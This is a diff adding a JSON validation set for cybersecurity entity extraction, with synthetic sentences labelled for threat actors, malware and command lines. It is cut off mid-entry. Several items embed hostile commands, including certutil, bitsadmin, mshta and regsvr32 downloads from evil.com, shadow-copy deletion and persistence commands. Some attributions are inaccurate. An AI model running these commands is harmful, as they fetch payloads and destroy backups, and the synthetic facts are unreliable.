@@ -1,0 +1,4409 @@
+{
+  "validation": [
+    {
+      "text": "Lazarus Group actors launched a Cobalt Strike campaign targeting systems in Europe.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 13,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 32,
+          "end": 45,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "APT28 modified the registry run keys and spawned cmd.exe to launch loader.exe.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 49,
+          "end": 56,
+          "label": "command-line",
+          "text": "cmd.exe"
+        },
+        {
+          "start": 67,
+          "end": 77,
+          "label": "malware",
+          "text": "loader.exe"
+        }
+      ]
+    },
+    {
+      "text": "sshd spawned a bash shell process for the user login session.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 4,
+          "label": "command-line",
+          "text": "sshd"
+        },
+        {
+          "start": 15,
+          "end": 19,
+          "label": "command-line",
+          "text": "bash"
+        }
+      ]
+    },
+    {
+      "text": "The Mimikatz credential dumper was executed via powershell.exe -ExecutionPolicy Bypass.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "malware",
+          "text": "Mimikatz"
+        },
+        {
+          "start": 48,
+          "end": 86,
+          "label": "command-line",
+          "text": "powershell.exe -ExecutionPolicy Bypass"
+        }
+      ]
+    },
+    {
+      "text": "CozyBear actors established a Cobalt Strike listener on port 443.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 30,
+          "end": 43,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Wannacry attack spread rapidly using DoublePulsar backdoor.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 12,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 41,
+          "end": 53,
+          "label": "malware",
+          "text": "DoublePulsar"
+        }
+      ]
+    },
+    {
+      "text": "APT29 operators executed schtasks.exe /create /tn 'Backup' /tr 'loader.exe' /sc daily.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT29"
+        },
+        {
+          "start": 25,
+          "end": 85,
+          "label": "command-line",
+          "text": "schtasks.exe /create /tn 'Backup' /tr 'loader.exe' /sc daily"
+        },
+        {
+          "start": 64,
+          "end": 74,
+          "label": "malware",
+          "text": "loader.exe"
+        }
+      ]
+    },
+    {
+      "text": "Emotet infected the target network and downloaded TrickBot module.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 6,
+          "label": "malware",
+          "text": "Emotet"
+        },
+        {
+          "start": 50,
+          "end": 58,
+          "label": "malware",
+          "text": "TrickBot"
+        }
+      ]
+    },
+    {
+      "text": "APT3 established command-and-control connection using custom loader.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 4,
+          "label": "threat-actor",
+          "text": "APT3"
+        }
+      ]
+    },
+    {
+      "text": "HermeticWiper ransomware wiped master boot records across production servers.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 13,
+          "label": "malware",
+          "text": "HermeticWiper"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-0 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-0.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-0.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-1 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-1.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-1.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-2 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-2.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-2.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-3 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-3.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-3.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-4 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-4.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-4.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-5 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-5.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-5.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-6 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-6.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-6.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-7 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-7.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-7.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-8 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-8.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-8.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-9 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-9.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 71,
+          "label": "malware",
+          "text": "loader-9.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-10 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 60,
+          "end": 73,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-10.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "loader-10.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-11 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 60,
+          "end": 73,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-11.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "loader-11.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-12 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 60,
+          "end": 73,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-12.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "loader-12.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-13 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 60,
+          "end": 73,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-13.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "loader-13.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 operators executed cmd.exe /c whoami on node-14 using Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 25,
+          "end": 42,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 60,
+          "end": 73,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group campaign deployed Wannacry malware clone loader-14.exe.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 36,
+          "end": 44,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 59,
+          "end": 72,
+          "label": "malware",
+          "text": "loader-14.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT29 operators utilized Cobalt Strike to establish a backdoor, running powershell.exe -ExecutionPolicy Bypass on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT29"
+        },
+        {
+          "start": 25,
+          "end": 38,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        },
+        {
+          "start": 72,
+          "end": 110,
+          "label": "command-line",
+          "text": "powershell.exe -ExecutionPolicy Bypass"
+        }
+      ]
+    },
+    {
+      "text": "The APT28 actors executed cmd.exe /c whoami to load their custom Mimikatz payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 9,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 26,
+          "end": 43,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 65,
+          "end": 73,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Emotet was injected after the execution of schtasks.exe /create /tn 'Update' /tr 'malware.exe'.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 25,
+          "label": "malware",
+          "text": "Emotet"
+        },
+        {
+          "start": 62,
+          "end": 113,
+          "label": "command-line",
+          "text": "schtasks.exe /create /tn 'Update' /tr 'malware.exe'"
+        }
+      ]
+    },
+    {
+      "text": "CozyBear launched a campaign deploying TrickBot.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "CozyBear"
+        },
+        {
+          "start": 39,
+          "end": 47,
+          "label": "malware",
+          "text": "TrickBot"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed certutil.exe -urlcache -f http://evil.com/mal.exe which triggered a Wannacry alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 77,
+          "label": "command-line",
+          "text": "certutil.exe -urlcache -f http://evil.com/mal.exe"
+        },
+        {
+          "start": 96,
+          "end": 104,
+          "label": "malware",
+          "text": "Wannacry"
+        }
+      ]
+    },
+    {
+      "text": "Sandworm operators utilized HermeticWiper to establish a backdoor, running net.exe user backup /add on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "Sandworm"
+        },
+        {
+          "start": 28,
+          "end": 41,
+          "label": "malware",
+          "text": "HermeticWiper"
+        },
+        {
+          "start": 75,
+          "end": 99,
+          "label": "command-line",
+          "text": "net.exe user backup /add"
+        }
+      ]
+    },
+    {
+      "text": "The Turla actors executed whoami to load their custom AgentTesla payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 9,
+          "label": "threat-actor",
+          "text": "Turla"
+        },
+        {
+          "start": 26,
+          "end": 32,
+          "label": "command-line",
+          "text": "whoami"
+        },
+        {
+          "start": 54,
+          "end": 64,
+          "label": "malware",
+          "text": "AgentTesla"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed RedLine was injected after the execution of sc.exe query type= service.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 26,
+          "label": "malware",
+          "text": "RedLine"
+        },
+        {
+          "start": 63,
+          "end": 89,
+          "label": "command-line",
+          "text": "sc.exe query type= service"
+        }
+      ]
+    },
+    {
+      "text": "APT41 launched a campaign deploying DoublePulsar.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT41"
+        },
+        {
+          "start": 36,
+          "end": 48,
+          "label": "malware",
+          "text": "DoublePulsar"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed taskkill /f /im explorer.exe which triggered a Pikabot alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 56,
+          "label": "command-line",
+          "text": "taskkill /f /im explorer.exe"
+        },
+        {
+          "start": 75,
+          "end": 82,
+          "label": "malware",
+          "text": "Pikabot"
+        }
+      ]
+    },
+    {
+      "text": "APT3 operators utilized Qakbot to establish a backdoor, running ping -n 1 10.0.0.5 on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 4,
+          "label": "threat-actor",
+          "text": "APT3"
+        },
+        {
+          "start": 24,
+          "end": 30,
+          "label": "malware",
+          "text": "Qakbot"
+        },
+        {
+          "start": 64,
+          "end": 82,
+          "label": "command-line",
+          "text": "ping -n 1 10.0.0.5"
+        }
+      ]
+    },
+    {
+      "text": "The Kimsuky actors executed vssadmin.exe delete shadows /all /quiet to load their custom Sliver payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 11,
+          "label": "threat-actor",
+          "text": "Kimsuky"
+        },
+        {
+          "start": 28,
+          "end": 67,
+          "label": "command-line",
+          "text": "vssadmin.exe delete shadows /all /quiet"
+        },
+        {
+          "start": 89,
+          "end": 95,
+          "label": "malware",
+          "text": "Sliver"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Remcos RAT was injected after the execution of cmd.exe /c echo 'test'.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 29,
+          "label": "malware",
+          "text": "Remcos RAT"
+        },
+        {
+          "start": 66,
+          "end": 88,
+          "label": "command-line",
+          "text": "cmd.exe /c echo 'test'"
+        }
+      ]
+    },
+    {
+      "text": "Chollima launched a campaign deploying AsyncRAT.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 8,
+          "label": "threat-actor",
+          "text": "Chollima"
+        },
+        {
+          "start": 39,
+          "end": 47,
+          "label": "malware",
+          "text": "AsyncRAT"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed cscript.exe script.js which triggered a NjRAT alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 49,
+          "label": "command-line",
+          "text": "cscript.exe script.js"
+        },
+        {
+          "start": 68,
+          "end": 73,
+          "label": "malware",
+          "text": "NjRAT"
+        }
+      ]
+    },
+    {
+      "text": "Mustang Panda operators utilized Lokibot to establish a backdoor, running mshta.exe http://evil.com/payload.hta on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 13,
+          "label": "threat-actor",
+          "text": "Mustang Panda"
+        },
+        {
+          "start": 33,
+          "end": 40,
+          "label": "malware",
+          "text": "Lokibot"
+        },
+        {
+          "start": 74,
+          "end": 111,
+          "label": "command-line",
+          "text": "mshta.exe http://evil.com/payload.hta"
+        }
+      ]
+    },
+    {
+      "text": "The Silent Librarian actors executed bitsadmin.exe /transfer myjob http://evil.com/payload.exe to load their custom DarkGate payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 20,
+          "label": "threat-actor",
+          "text": "Silent Librarian"
+        },
+        {
+          "start": 37,
+          "end": 94,
+          "label": "command-line",
+          "text": "bitsadmin.exe /transfer myjob http://evil.com/payload.exe"
+        },
+        {
+          "start": 116,
+          "end": 124,
+          "label": "malware",
+          "text": "DarkGate"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Bumblebee was injected after the execution of regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 28,
+          "label": "malware",
+          "text": "Bumblebee"
+        },
+        {
+          "start": 65,
+          "end": 125,
+          "label": "command-line",
+          "text": "regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"
+        }
+      ]
+    },
+    {
+      "text": "Lace Tempest launched a campaign deploying Cobalt Strike.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 12,
+          "label": "threat-actor",
+          "text": "Lace Tempest"
+        },
+        {
+          "start": 43,
+          "end": 56,
+          "label": "malware",
+          "text": "Cobalt Strike"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed cmd.exe /c whoami which triggered a Mimikatz alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 45,
+          "label": "command-line",
+          "text": "cmd.exe /c whoami"
+        },
+        {
+          "start": 64,
+          "end": 72,
+          "label": "malware",
+          "text": "Mimikatz"
+        }
+      ]
+    },
+    {
+      "text": "APT28 operators utilized Emotet to establish a backdoor, running schtasks.exe /create /tn 'Update' /tr 'malware.exe' on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT28"
+        },
+        {
+          "start": 25,
+          "end": 31,
+          "label": "malware",
+          "text": "Emotet"
+        },
+        {
+          "start": 65,
+          "end": 116,
+          "label": "command-line",
+          "text": "schtasks.exe /create /tn 'Update' /tr 'malware.exe'"
+        }
+      ]
+    },
+    {
+      "text": "The Lazarus Group actors executed reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to load their custom TrickBot payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 17,
+          "label": "threat-actor",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 34,
+          "end": 96,
+          "label": "command-line",
+          "text": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        },
+        {
+          "start": 118,
+          "end": 126,
+          "label": "malware",
+          "text": "TrickBot"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Wannacry was injected after the execution of certutil.exe -urlcache -f http://evil.com/mal.exe.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 27,
+          "label": "malware",
+          "text": "Wannacry"
+        },
+        {
+          "start": 64,
+          "end": 113,
+          "label": "command-line",
+          "text": "certutil.exe -urlcache -f http://evil.com/mal.exe"
+        }
+      ]
+    },
+    {
+      "text": "Fancy Bear launched a campaign deploying HermeticWiper.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 10,
+          "label": "threat-actor",
+          "text": "Fancy Bear"
+        },
+        {
+          "start": 41,
+          "end": 54,
+          "label": "malware",
+          "text": "HermeticWiper"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed whoami which triggered a AgentTesla alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 34,
+          "label": "command-line",
+          "text": "whoami"
+        },
+        {
+          "start": 53,
+          "end": 63,
+          "label": "malware",
+          "text": "AgentTesla"
+        }
+      ]
+    },
+    {
+      "text": "Turla operators utilized RedLine to establish a backdoor, running sc.exe query type= service on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "Turla"
+        },
+        {
+          "start": 25,
+          "end": 32,
+          "label": "malware",
+          "text": "RedLine"
+        },
+        {
+          "start": 66,
+          "end": 92,
+          "label": "command-line",
+          "text": "sc.exe query type= service"
+        }
+      ]
+    },
+    {
+      "text": "The MuddyWater actors executed tasklist /v to load their custom DoublePulsar payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 14,
+          "label": "threat-actor",
+          "text": "MuddyWater"
+        },
+        {
+          "start": 31,
+          "end": 42,
+          "label": "command-line",
+          "text": "tasklist /v"
+        },
+        {
+          "start": 64,
+          "end": 76,
+          "label": "malware",
+          "text": "DoublePulsar"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed Pikabot was injected after the execution of taskkill /f /im explorer.exe.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 26,
+          "label": "malware",
+          "text": "Pikabot"
+        },
+        {
+          "start": 63,
+          "end": 91,
+          "label": "command-line",
+          "text": "taskkill /f /im explorer.exe"
+        }
+      ]
+    },
+    {
+      "text": "APT35 launched a campaign deploying Qakbot.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 5,
+          "label": "threat-actor",
+          "text": "APT35"
+        },
+        {
+          "start": 36,
+          "end": 42,
+          "label": "malware",
+          "text": "Qakbot"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed vssadmin.exe delete shadows /all /quiet which triggered a Sliver alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 67,
+          "label": "command-line",
+          "text": "vssadmin.exe delete shadows /all /quiet"
+        },
+        {
+          "start": 86,
+          "end": 92,
+          "label": "malware",
+          "text": "Sliver"
+        }
+      ]
+    },
+    {
+      "text": "Kimsuky operators utilized Remcos RAT to establish a backdoor, running cmd.exe /c echo 'test' on the server.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 7,
+          "label": "threat-actor",
+          "text": "Kimsuky"
+        },
+        {
+          "start": 27,
+          "end": 37,
+          "label": "malware",
+          "text": "Remcos RAT"
+        },
+        {
+          "start": 71,
+          "end": 93,
+          "label": "command-line",
+          "text": "cmd.exe /c echo 'test'"
+        }
+      ]
+    },
+    {
+      "text": "The Volt Typhoon actors executed wscript.exe script.vbs to load their custom AsyncRAT payload.",
+      "entities": [
+        {
+          "start": 4,
+          "end": 16,
+          "label": "threat-actor",
+          "text": "Volt Typhoon"
+        },
+        {
+          "start": 33,
+          "end": 55,
+          "label": "command-line",
+          "text": "wscript.exe script.vbs"
+        },
+        {
+          "start": 77,
+          "end": 85,
+          "label": "malware",
+          "text": "AsyncRAT"
+        }
+      ]
+    },
+    {
+      "text": "Forensics revealed NjRAT was injected after the execution of cscript.exe script.js.",
+      "entities": [
+        {
+          "start": 19,
+          "end": 24,
+          "label": "malware",
+          "text": "NjRAT"
+        },
+        {
+          "start": 61,
+          "end": 82,
+          "label": "command-line",
+          "text": "cscript.exe script.js"
+        }
+      ]
+    },
+    {
+      "text": "Hafnium launched a campaign deploying Lokibot.",
+      "entities": [
+        {
+          "start": 0,
+          "end": 7,
+          "label": "threat-actor",
+          "text": "Hafnium"
+        },
+        {
+          "start": 38,
+          "end": 45,
+          "label": "malware",
+          "text": "Lokibot"
+        }
+      ]
+    },
+    {
+      "text": "A compromised node executed bitsadmin.exe /transfer myjob http://evil.com/payload.exe which triggered a DarkGate alert from EDR.",
+      "entities": [
+        {
+          "start": 28,
+          "end": 85,
+          "label": "command-line",
+          "text": "bitsadmin.exe /transfer myjob http://evil.com/payload.exe"
+        },
+        {
